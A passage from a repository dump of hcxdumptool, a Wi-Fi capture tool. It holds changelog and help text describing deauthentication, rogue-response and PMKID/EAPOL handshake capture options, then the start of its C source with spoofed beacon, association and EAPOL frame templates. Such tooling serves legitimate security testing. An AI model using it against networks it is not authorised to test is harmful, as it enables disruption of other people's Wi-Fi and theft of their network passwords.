                                   deauthentication attacks will not work against protected management frames\n--disable_client_attacks           : disable attacks on single clients points\n                                     affected: ap-less (EAPOL 2/4 - M2) attack\n--enable_status                    : enable status messages\n--help                             : show this help\n--version                          : show version\n\n\n\n01.08.2018\n==========\nmoved some stuff from hcxtools to hcxdumptool repository\nprepare complete refactoring!\n\n\n04.03.2018\n==========\nhcxdumptool: added new option -W\n-W <dump file> : WEP encrypted packets output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n\n\n04.03.2018\n==========\nhcxdumptool again complete refactored:\n\n\n02.03.2018\n==========\nhcxdumptool is complete refactored:\n- improved scan engine\n- improved authentication engine (incl. Radio Measurement, and NULL frame detection)\n- dropped timer\n- use threads for LED and channel switch\n- use only one file descriptor for raw socket operations\n- working on Intel Corporation Centrino Ultimate-N 6300 (rev 3e) WiFi adapter (kernel >= 4.15)\n- working on Alfa AWUS036NH, Alfa AWUS036NHA\n- working on Alfa AWUS036ACH (driver: https://github.com/kimocoder/rtl8812au)\n- more channels allowed (depends on installed wireless regulatory domain)\n- simple usage: hcxdumptool -i <interface> -o dumpfile.pcap -t 5\n  interface (real interface - no monX) must be in monitor - all services/programs with access to the interface must be stopped! \n- new format of blacklist\n- and more...\n\nreported to run on Gentoo\nhttps://github.com/ZerBea/hcxdumptool_bleeding_testing/issues/2#issuecomment-369256915\n\nreported to run on OpenWRT/LEDE\nhttps://github.com/ZerBea/hcxdumptool_bleeding_testing/issues/3#issuecomment-369756725\n\nreported to run with Intel Corporation Centrino Ultimate-N 6300 (rev 3e)\nhttps://github.com/ZerBea/hcxdumptool_bleeding_testing/issues/2#issuecomment-369259800\n\n$ hcxdumptool -h\nhcxdumptool 4.1.0 (C) 2018 ZeroBeat\nusage:\nhcxdumptool <options>\n\noptions:\n-i <interface> : interface (monitor mode must be eanabled)\n                 ip link set <interface> down\n                 iw dev <interface> set type monitor\n                 ip link set <interface> up\n-o <dump file> : output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-O <dump file> : ip based traffic output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-c <digit>     : set scanlist  (1,2,3,... / default = default scanlist)\n                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12\n                 allowed channels:\n                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n                 36, 40, 44, 48, 52, 56, 60, 64\n                 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 147, 151, 155, 167\n-t <seconds>   : stay time on channel before hopping to the next channel\n                 default = 5 seconds\n-T <maxerrors> : terminate after <x> maximal errors\n               : default: 1000000\n-D             : do not transmit deauthentications or disassociations\n-R             : do not transmit requests\n-A             : do not respond to requests from clients\n-B <file>      : blacklist (do not deauthenticate clients from this hosts)\n                 format = mac_ap:mac_sta:ESSID\n                 112233445566:aabbccddeeff:networkname (max. 32 chars)\n-P             : enable poweroff\n-s             : enable status messages\n-I             : show suitable wlan interfaces and quit\n-h             : show this help\n-v             : show version\n\n\n27.02.2018\n==========\nNow recommendations since we are run into heavy problems with latest drivers and operating systems\n* Operatingsystem: archlinux (strict), Kernel >= 4.14 (strict)\n* Raspberry Pi A, B, A+, B+ (Recommended: A+ = very low power consumption or B+), but notebooks and desktops could work, too.\n* GPIO hardware mod recommended\n\nSupported adapters (strict)\n* USB ID 148f:7601 Ralink Technology, Corp. MT7601U Wireless Adapter\n* USB ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter\n* USB ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter\n* USB ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter\n* USB ID 0bda:8189 Realtek Semiconductor Corp. RTL8187B Wireless 802.11g 54Mbps Network Adapter\n \n\n25.02.2018\n==========\n- initial start of this repository\n- added hcxdumptool\n- added hcxpioff\n\n"
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "hcxdumptool.c",
          "type": "blob",
          "size": 185.5185546875,
          "content": "#define _GNU_SOURCE\n#include <arpa/inet.h>\n#include <endian.h>\n#include <errno.h>\n#if defined (_POSIX_VERSION)\n#include <fcntl.h>\n#endif\n#if defined (__GLIBC__)\n#include <gnu/libc-version.h>\n#endif\n#include <getopt.h>\n#include <inttypes.h>\n#include <libgen.h>\n#include <linux/filter.h>\n#include <linux/genetlink.h>\n#include <linux/if_packet.h>\n#include <linux/limits.h>\n#include <linux/nl80211.h>\n#include <linux/rtnetlink.h>\n#include <linux/version.h>\n#include <net/ethernet.h>\n#include <net/if.h>\n#include <signal.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/epoll.h>\n#include <sys/file.h>\n#include <sys/mman.h>\n#include <sys/time.h>\n#include <sys/timerfd.h>\n#if defined (_POSIX_VERSION)\n#include <sys/stat.h>\n#include <sys/utsname.h>\n#include <termios.h>\n#endif\n#ifdef HCXWANTLIBPCAP\n#include <pcap/pcap.h>\n#endif\n#include \"include/types.h\"\n#include \"include/byteorder.h\"\n#include \"include/hcxdumptool.h\"\n#include \"include/ieee80211.h\"\n#include \"include/pcapng.h\"\n#include \"include/radiotap.h\"\n#include \"include/raspberry.h\"\n/*===========================================================================*/\n/* global var */\nstatic bool deauthenticationflag = true;\nstatic bool proberequestflag = true;\nstatic bool associationflag = true;\nstatic bool reassociationflag = true;\nstatic bool activemonitorflag = false;\nstatic bool vmflag = true;\nstatic bool beaconoffflag = false;\n\nstatic u16 wanteventflag = 0;\nstatic u16 exiteapolpmkidflag = 0;\nstatic u16 exiteapolm4flag = 0;\nstatic u16 exiteapolm3flag = 0;\nstatic u16 exiteapolm2flag = 0;\nstatic u16 exiteapolm1flag = 0;\n\nstatic int gpiostatusled = 0;\nstatic int gpiobutton = 0;\n\nstatic pid_t hcxpid = 0;\n\nstatic unsigned int seed = 7;\n\nstatic int fd_socket_nl = 0;\nstatic int fd_socket_rt = 0;\nstatic int fd_socket_unix = 0;\nstatic int fd_socket_rx = 0;\nstatic int fd_socket_tx = 0;\nstatic int fd_timer1 = 0;\nstatic int fd_pcapng = 0;\n\nstatic u8 rdsort = 0;\n#ifdef HCXSTATUSOUT\nstatic long int wecbcount = 0;\nstatic long int wepbcount = 0;\nstatic long int widbcount = 0;\nstatic long int wshbcount = 0;\n#endif\n\n#ifdef HCXNMEAOUT\nstatic int fd_gps = 0;\nstatic int fd_hcxpos = 0;\nstatic bool nmea2pcapflag = false;\nstatic long int nmeapacketcount = 0;\nstatic long int wecbnmeacount = 0;\nstatic long int wgpwplcount = 0;\n#endif\n\n#ifdef HCXDEBUG\nstatic FILE *fh_debug = NULL;\n#endif\nstatic struct sock_fprog bpf = { 0 };\n\nstatic int ifaktindex = 0;\nstatic u8 ifaktstatus = 0;\nstatic u8 ifakttype = 0;\n\nstatic frequencylist_t *ifaktfrequencylist = NULL;\nstatic char ifaktname[IF_NAMESIZE] = { 0 };\nstatic u8 ifakthwmac[ETH_ALEN] = { 0 };\n\nstatic u16 nlfamily = 0;\nstatic u32 nlseqcounter = 1;\n\nstatic size_t ifpresentlistcounter = 0;\n\nstatic size_t scanlistindex = 0;\nstatic frequencylist_t *scanlist = NULL;\n\nstatic interface_t *ifpresentlist;\n\nstatic aplist_t* aplist = NULL;\nstatic aprglist_t* aprglist = NULL;\nstatic clientlist_t* clientlist = NULL;\nstatic maclist_t* maclist = NULL;\nstatic u64 lifetime = 0;\nstatic u32 ouiaprg = 0;\nstatic u32 nicaprg = 0;\nstatic u32 ouiclientrg = 0;\nstatic u32 nicclientrg = 0;\nstatic u64 replaycountrg = 0;\n\nstatic struct timespec tspecakt = { 0 };\nstatic u64 tsakt = 0;\nstatic u64 tsfirst = 0;\nstatic u64 tshold = 0;\nstatic u64 tottime = 0;\nstatic u64 timehold = TIMEHOLD;\nstatic int timerwaitnd = TIMER_EPWAITND;\n\nstatic u32 errorcountmax = ERROR_MAX;\nstatic u32 errorcount = 0;\nstatic u32 errortxcount = 0;\n\nstatic u32 watchdogcountmax = WATCHDOG_MAX;\nstatic u32 attemptapmax = ATTEMPTAP_MAX;\nstatic u32 attemptclientmax = ATTEMPTCLIENT_MAX;\n\nstatic u64 packetcount = 1;\nstatic u64 packetrcarxcount = 0;\nstatic u64 packetrcatxcount = 0;\nstatic size_t proberesponseindex = 0;\n\nstatic u32 proberesponsetxmax = PROBERESPONSETX_MAX;\n\nstatic u64 beacontimestamp = 1;\n\nstatic rth_t *rth = NULL;\nstatic ssize_t packetlen = 0;\nstatic u8 *packetptr = NULL;\nstatic u16 ieee82011len = 0;\nstatic u8 *ieee82011ptr = NULL;\nstatic u16 payloadlen = 0;\nstatic u8 *payloadptr = NULL;\nstatic ieee80211_mac_t *macfrx = NULL;\nstatic u8 *llcptr = NULL;\nstatic ieee80211_llc_t *llc = NULL;\nstatic u16 eapauthlen = 0;\nstatic ieee80211_eapauth_t *eapauth;\nstatic u16 eapauthpllen = 0;\nstatic u8 *eapauthplptr = NULL;\nstatic u16 eapolpllen = 0;\nstatic u8 *eapolplptr = NULL;\nstatic ieee80211_wpakey_t *wpakey;\nstatic ieee80211_pmkid_t *pmkid;\nstatic u16 keyinfo = 0;\nstatic u8 kdv = 0;\n\nstatic enhanced_packet_block_t *epbhdr = NULL;\n#ifdef HCXNMEAOUT\nstatic ssize_t nmealen = 0;\nstatic ssize_t gprmclen = 0;\nstatic ssize_t gpggalen = 0;\n#endif\nstatic ieee80211_mac_t *macftx = NULL;\nstatic u16 seqcounter1 = 1; /* deauthentication / disassociation */\nstatic u16 seqcounter2 = 1; /* proberequest authentication association */\nstatic u16 seqcounter3 = 1; /* probereresponse authentication response 3 */\nstatic u16 seqcounter4 = 1; /* beacon */\n/*---------------------------------------------------------------------------*/\n#ifdef HCXNMEAOUT\nstatic const char gpwplid[] = \"$GPWPL\";\nstatic const char gptxtid[] = \"$GPTXT,\";\nstatic const char lookuptable[] = { '0', '1', '2','3','4','5','6','7','8','9','a','b','c','d','e','f' };\n#endif\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic const u8 beacondata[] =\n{\n/* Tag SSID: WILDCARD */\n0x00, 0x00,\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: DS Parameter set: Current Channel: 1 */\n0x03, 0x01, 0x01,\n/* Tag: TIM Information */\n0x05, 0x04, 0x00, 0x01, 0x00, 0x00,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,\n/* Tag: RSN Information CCM CCM PSK */\n0x30, 0x14, 0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04,\n0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04,\n0x01, 0x00,\n0x00, 0x0f, 0xac, 0x02,\n0x00, 0x00,\n};\n#define BEACONDATA_SIZE sizeof(beacondata)\n\n/*---------------------------------------------------------------------------*/\nstatic const u8 proberesponsedata[] =\n{\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: DS Parameter set: Current Channel: 1 */\n0x03, 0x01, 0x01,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,\n/* Tag: RSN Information CCM CCM PSK */\n0x30, 0x14, 0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04,\n0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04,\n0x01, 0x00,\n0x00, 0x0f, 0xac, 0x02,\n0x00, 0x00,\n};\n#define PROBERESPONSEDATA_SIZE sizeof(proberesponsedata)\n/*---------------------------------------------------------------------------*/\nstatic const u8 proberequest_undirected_data[] =\n{\n/* Tag: Wildcard */\n0x00, 0x00,\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c\n};\n#define PROBEREQUEST_UNDIRECTED_SIZE sizeof(proberequest_undirected_data)\n/*---------------------------------------------------------------------------*/\nstatic const u8 authenticationrequestdata[] =\n{\n0x00, 0x00, 0x01, 0x00, 0x00, 0x00\n};\n#define AUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)\n/*---------------------------------------------------------------------------*/\nstatic const u8 authenticationresponsedata[] =\n{\n0x00, 0x00, 0x02, 0x00, 0x00, 0x00\n};\n#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)\n/*---------------------------------------------------------------------------*/\nstatic const u8 reassociationrequestdata[] =\n{\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,\n/* RSN information AES PSK (WPA2) */\n0x30, 0x14, 0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04, /* group cipher */\n0x01, 0x00, /* count */\n0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */\n0x01, 0x00, /* count */\n0x00, 0x0f, 0xac, 0x02, /* AKM */\n0x80, 0x00,\n/* RM Enabled Capabilities */\n0x46, 0x05, 0x7b, 0x00, 0x02, 0x00, 0x00,\n/* Supported Operating Classes */\n0x3b, 0x04, 0x51, 0x51, 0x53, 0x54\n};\n#define REASSOCIATIONREQUEST_SIZE sizeof(reassociationrequestdata)\n/*---------------------------------------------------------------------------*/\nstatic const u8 associationrequestcapa[] =\n{\n0x31, 0x04, 0x05, 0x00\n};\n#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)\n/*---------------------------------------------------------------------------*/\nstatic const u8 associationrequestdata[] =\n{\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,\n/* RSN information AES PSK (WPA2) */\n0x30, 0x14, 0x01, 0x00,\n0x00, 0x0f, 0xac, 0x04, /* group cipher */\n0x01, 0x00, /* count */\n0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */\n0x01, 0x00, /* count */\n0x00, 0x0f, 0xac, 0x02, /* AKM */\n0x80, 0x00,\n/* RM Enabled Capabilities */\n0x46, 0x05, 0x7b, 0x00, 0x02, 0x00, 0x00,\n/* Supported Operating Classes */\n0x3b, 0x04, 0x51, 0x51, 0x53, 0x54\n};\n#define ASSOCIATIONREQUEST_SIZE sizeof(associationrequestdata)\n/*---------------------------------------------------------------------------*/\nstatic const u8 associationresponsedata[] =\n{\n/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */\n0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,\n/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */\n0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,\n/* Tag: Extended Capabilities (8 octets) */\n//0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40\n};\n#define ASSOCIATIONRESPONSEDATA_SIZE sizeof(associationresponsedata)\n/*---------------------------------------------------------------------------*/\nstatic u8 eapolm1data[] =\n{\n/* LLC */\n0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,\n/* M1 WPA2 */\n0x02,\n0x03,\n0x00, 0x5f,\n0x02,\n0x00, 0x8a,\n0x00, 0x10,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00\n};\n#define EAPOLM1DATA_SIZE sizeof(eapolm1data)\n/*---------------------------------------------------------------------------*/\nstatic const u8 eaprequestiddata[] =\n{\n0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,\n0x01, 0x00, 0x00, 0x05, 0x01, 0x01, 0x00, 0x05, 0x01\n};\n#define EAPREQUESTID_SIZE sizeof(eaprequestiddata)\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic u8 macaprghidden[ETH_ALEN] = { 0 };\nstatic u8 macaprg[ETH_ALEN] = { 0 };\nstatic u8 macclientrg[ETH_ALEN +2] = { 0 };\nstatic u8 anoncerg[32] = { 0 };\nstatic u8 snoncerg[32] = { 0 };\nstatic char weakcandidate[PSK_MAX];\nstatic char timestring1[TIMESTRING_LEN];\nstatic char timestring2[TIMESTRING_LEN];\n\nstatic char country[3];\n\nstatic authseqakt_t authseqakt = { 0 };\n\nstatic u8 nltxbuffer[NLTX_SIZE] = { 0 };\nstatic u8 nlrxbuffer[NLRX_SIZE] = { 0 };\n\nstatic u8 epb[PCAPNG_SNAPLEN * 2] = { 0 };\nstatic u8 epbown[WLTXBUFFER] = { 0 };\nstatic u8 wltxbuffer[WLTXBUFFER] = { 0 };\n\n#ifdef HCXNMEAOUT\nstatic char nmeabuffer[NMEA_SIZE] = { 0 };\nstatic char gpwpl[NMEA_MSG_MAX] = { 0 };\nstatic char gprmc[NMEA_MSG_MAX] = { 0 };\nstatic char gpgga[NMEA_MSG_MAX] = { 0 };\nstatic char gptxt[NMEA_MSG_MAX] = { 0 };\n#endif\n\nstatic char rtb[RTD_LEN] = { 0 };\n/*===========================================================================*/\n/*===========================================================================*/\n/* status print */\nstatic void show_interfacecapabilities2(void)\n{\nstatic size_t i;\nstatic size_t ifl;\nstatic const char *po = \"N/A\";\nstatic const char *mode = \"-\";\nstatic frequencylist_t *iffreql;\n\nfor(i = 0; i < ifpresentlistcounter; i++)\n\t{\n\tif((ifpresentlist +i)->index != ifaktindex) continue;\n\tfprintf(stdout, \"interface information:\\n\\nphy idx hw-mac       virtual-mac  m ifname           driver (protocol)\\n\"\n\t\t\t\"---------------------------------------------------------------------------------------------\\n\");\n\tif(((ifpresentlist +i)->type & IF_HAS_NETLINK) == IF_HAS_NETLINK) po = \"NETLINK\";\n\tif(((ifpresentlist +i)->type & IFTYPEMONACT) == IFTYPEMONACT) mode = \"*\";\n\telse if(((ifpresentlist +i)->type & IFTYPEMON) == IFTYPEMON) mode = \"+\";\n\tfprintf(stdout, \"%3d %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s %-*s %s (%s)\\n\", (ifpresentlist +i)->wiphy, (ifpresentlist +i)->index,\n\t\t(ifpresentlist +i)->hwmac[0], (ifpresentlist +i)->hwmac[1], (ifpresentlist +i)->hwmac[2], (ifpresentlist +i)->hwmac[3], (ifpresentlist +i)->hwmac[4], (ifpresentlist +i)->hwmac[5],\n\t\t(ifpresentlist +i)->vimac[0], (ifpresentlist +i)->vimac[1], (ifpresentlist +i)->vimac[2], (ifpresentlist +i)->vimac[3], (ifpresentlist +i)->vimac[4], (ifpresentlist +i)->vimac[5],\n\t\tmode, IF_NAMESIZE, (ifpresentlist +i)->name, (ifpresentlist +i)->driver, po);\n\tiffreql = (ifpresentlist +i)->frequencylist;\n\tfprintf(stdout, \"\\n\\navailable frequencies: frequency [channel] tx-power of Regulatory Domain: %s\\n\", country);\n\tfor(ifl = 0; ifl < FREQUENCYLIST_MAX; ifl++)\n\t\t{\n\t\tif((iffreql + ifl)->frequency == 0) break;\n\t\tif(ifl % 4 == 0) fprintf(stdout, \"\\n\");\n\t\telse  fprintf(stdout, \"\\t\");\n\t\tif((iffreql + ifl)->status == 0) fprintf(stdout, \"%6d [%3d] %.1f dBm\", (iffreql + ifl)->frequency, (iffreql + ifl)->channel, 0.01 *(iffreql + ifl)->pwr);\n\t\telse fprintf(stdout, \"%6d [%3d] disabled\", (iffreql + ifl)->frequency, (iffreql + ifl)->channel);\n\t\t}\n\tfprintf(stdout, \"\\n\");\n\tfprintf(stdout, \"\\n\\nscan frequencies: frequency [channel] of Regulatory Domain: %s\\n\", country);\n\tfor(ifl = 0; ifl < FREQUENCYLIST_MAX; ifl++)\n\t\t{\n\t\tif((scanlist + ifl)->frequency == 0) break;\n\t\tif(ifl % 5 == 0) fprintf(stdout, \"\\n\");\n\t\telse  fprintf(stdout, \"\\t\");\n\t\tfprintf(stdout, \"%6d [%3d]\", (scanlist + ifl)->frequency, (scanlist + ifl)->channel);\n\t\t}\n\tfprintf(stdout, \"\\n\");\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic void show_interfacecapabilities(void)\n{\nstatic size_t i;\nstatic size_t ifl;\n\nstatic const char *po = \"N/A\";\nstatic const char *mode = \"-\";\nstatic frequencylist_t *iffreql;\n\nfor(i = 0; i < ifpresentlistcounter; i++)\n\t{\n\tif((ifpresentlist +i)->index != ifaktindex) continue;\n\tfprintf(stdout, \"interface information:\\n\\nphy idx hw-mac       virtual-mac  m ifname           driver (protocol)\\n\"\n\t\t\t\"---------------------------------------------------------------------------------------------\\n\");\n\tif(((ifpresentlist +i)->type & IF_HAS_NETLINK) == IF_HAS_NETLINK) po = \"NETLINK\";\n\tif(((ifpresentlist +i)->type & IFTYPEMONACT) == IFTYPEMONACT) mode = \"*\";\n\telse if(((ifpresentlist +i)->type & IFTYPEMON) == IFTYPEMON) mode = \"+\";\n\tfprintf(stdout, \"%3d %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s %-*s %s (%s)\\n\", (ifpresentlist +i)->wiphy, (ifpresentlist +i)->index,\n\t\t(ifpresentlist +i)->hwmac[0], (ifpresentlist +i)->hwmac[1], (ifpresentlist +i)->hwmac[2], (ifpresentlist +i)->hwmac[3], (ifpresentlist +i)->hwmac[4], (ifpresentlist +i)->hwmac[5],\n\t\t(ifpresentlist +i)->vimac[0], (ifpresentlist +i)->vimac[1], (ifpresentlist +i)->vimac[2], (ifpresentlist +i)->vimac[3], (ifpresentlist +i)->vimac[4], (ifpresentlist +i)->vimac[5],\n\t\tmode, IF_NAMESIZE, (ifpresentlist +i)->name, (ifpresentlist +i)->driver, po);\n\tiffreql = (ifpresentlist +i)->frequencylist;\n\tfprintf(stdout, \"\\n\\navailable frequencies: frequency [channel] tx-power of Regulatory Domain: %s\\n\", country);\n\tfor(ifl = 0; ifl < FREQUENCYLIST_MAX; ifl++)\n\t\t{\n\t\tif((iffreql + ifl)->frequency == 0) break;\n\t\tif(ifl % 4 == 0) fprintf(stdout, \"\\n\");\n\t\telse  fprintf(stdout, \"\\t\");\n\t\tif((iffreql + ifl)->status == 0) fprintf(stdout, \"%6d [%3d] %.1f dBm\", (iffreql + ifl)->frequency, (iffreql + ifl)->channel, 0.01 *(iffreql + ifl)->pwr);\n\t\telse fprintf(stdout, \"%6d [%3d] disabled\", (iffreql + ifl)->frequency, (iffreql + ifl)->channel);\n\t\t}\n\tfprintf(stdout, \"\\n\");\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic void show_interfacelist_short(void)\n{\nstatic size_t i;\nstatic const char *po = \"N/A\";\nstatic const char *mode = \"-\";\n\nfor(i = 0; i < ifpresentlistcounter; i++)\n\t{\n\tif(((ifpresentlist +i)->type & IF_HAS_NETLINK) == IF_HAS_NETLINK) po = \"NETLINK\";\n\tif(((ifpresentlist +i)->type & IFTYPEMONACT) == IFTYPEMONACT) mode = \"*\";\n\telse if(((ifpresentlist +i)->type & IFTYPEMON) == IFTYPEMON) mode = \"+\";\n\tfprintf(stdout, \"%3d\\t%3d\\t%02x%02x%02x%02x%02x%02x\\t%02x%02x%02x%02x%02x%02x\\t%s\\t%-*s\\t%s\\t%s\\n\", (ifpresentlist +i)->wiphy, (ifpresentlist +i)->index,\n\t\t(ifpresentlist +i)->hwmac[0], (ifpresentlist +i)->hwmac[1], (ifpresentlist +i)->hwmac[2], (ifpresentlist +i)->hwmac[3], (ifpresentlist +i)->hwmac[4], (ifpresentlist +i)->hwmac[5],\n\t\t(ifpresentlist +i)->vimac[0], (ifpresentlist +i)->vimac[1], (ifpresentlist +i)->vimac[2], (ifpresentlist +i)->vimac[3], (ifpresentlist +i)->vimac[4], (ifpresentlist +i)->vimac[5],\n\t\tmode, IF_NAMESIZE, (ifpresentlist +i)->name, (ifpresentlist +i)->driver, po);\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic void show_interfacelist(void)\n{\nstatic size_t i;\nstatic const char *po = \"N/A\";\nstatic const char *mode = \"-\";\n\nfprintf(stdout, \"available wlan devices:\\n\\nphy idx hw-mac       virtual-mac  m ifname           driver (protocol)\\n\"\n\t\t\"---------------------------------------------------------------------------------------------\\n\");\nfor(i = 0; i < ifpresentlistcounter; i++)\n\t{\n\tif(((ifpresentlist +i)->type & IF_HAS_NETLINK) == IF_HAS_NETLINK) po = \"NETLINK\";\n\tif(((ifpresentlist +i)->type & IFTYPEMONACT) == IFTYPEMONACT) mode = \"*\";\n\telse if(((ifpresentlist +i)->type & IFTYPEMON) == IFTYPEMON) mode = \"+\";\n\tfprintf(stdout, \"%3d %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s %-*s %s (%s)\\n\", (ifpresentlist +i)->wiphy, (ifpresentlist +i)->index,\n\t\t(ifpresentlist +i)->hwmac[0], (ifpresentlist +i)->hwmac[1], (ifpresentlist +i)->hwmac[2], (ifpresentlist +i)->hwmac[3], (ifpresentlist +i)->hwmac[4], (ifpresentlist +i)->hwmac[5],\n\t\t(ifpresentlist +i)->vimac[0], (ifpresentlist +i)->vimac[1], (ifpresentlist +i)->vimac[2], (ifpresentlist +i)->vimac[3], (ifpresentlist +i)->vimac[4], (ifpresentlist +i)->vimac[5],\n\t\tmode, IF_NAMESIZE, (ifpresentlist +i)->name, (ifpresentlist +i)->driver, po);\n\t}\nfprintf(stdout, \"\\n\"\n\t\t\"* active monitor mode available (reported by driver - do not trust it)\\n\"\n\t\t\"+ monitor mode available (reported by driver)\\n\"\n\t\t\"- no monitor mode available\\n\");\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline void show_realtime_rca(void)\n{\nstatic size_t i;\nstatic size_t p;\nstatic time_t tvlastb;\nstatic time_t tvlastp;\nstatic char *ak;\nstatic char *pmdef = \" \";\nstatic char *pmok = \"+\";\nstatic char *notime = \"        \";\n\nif(system(\"clear\") != 0) errorcount++;\nif(rdsort == 0) qsort(aplist, RCAD_MAX, APLIST_SIZE, sort_aplist_by_tsakt);\nelse qsort(aplist, RCAD_MAX, APLIST_SIZE, sort_aplist_by_count);\nsprintf(&rtb[0], \" CHA  FREQ  BEACON  RESPONSE S    MAC-AP    ESSID  SCAN-FREQUENCY: %6u\\n\"\n\t\"--------------------------------------------------------------------------\\n\", (scanlist + scanlistindex)->frequency);\np = strlen(rtb);\ni = 0;\nfor(i = 0; i < RCAD_MAX ; i++)\n\t{\n\tif((aplist +i)->tsakt == 0) break;\n\tif(((aplist +i)->ie.flags & APAKM_MASK) != 0) ak = pmok;\n\telse ak = pmdef;\n\ttvlastb = (aplist +i)->tsakt / 1000000000ULL;\n\tstrftime(timestring1, TIMESTRING_LEN, \"%H:%M:%S\", localtime(&tvlastb));\n\tif(((aplist +i)->status & AP_PROBERESPONSE) == AP_PROBERESPONSE)\n\t\t{\n\t\ttvlastp = (aplist +i)->tsauth / 1000000000ULL;\n\t\tstrftime(timestring2, TIMESTRING_LEN, \"%H:%M:%S\", localtime(&tvlastp));\n\t\t}\n\telse strncpy(timestring2, notime, TIMESTRING_LEN);\n\tsprintf(&rtb[p], \" %3d %5d %s %s %s %02x%02x%02x%02x%02x%02x %.*s [%u]\\n\",\n\t\t\t(aplist +i)->ie.channel, (aplist +i)->frequency, timestring1, timestring2, ak,\n\t\t\t(aplist +i)->macap[0], (aplist +i)->macap[1], (aplist +i)->macap[2], (aplist +i)->macap[3], (aplist +i)->macap[4], (aplist +i)->macap[5],\n\t\t\t(aplist +i)->ie.essidlen, (aplist +i)->ie.essid, (aplist +i)->count);\n\tp = strlen(rtb);\n\t}\nrtb[p] = 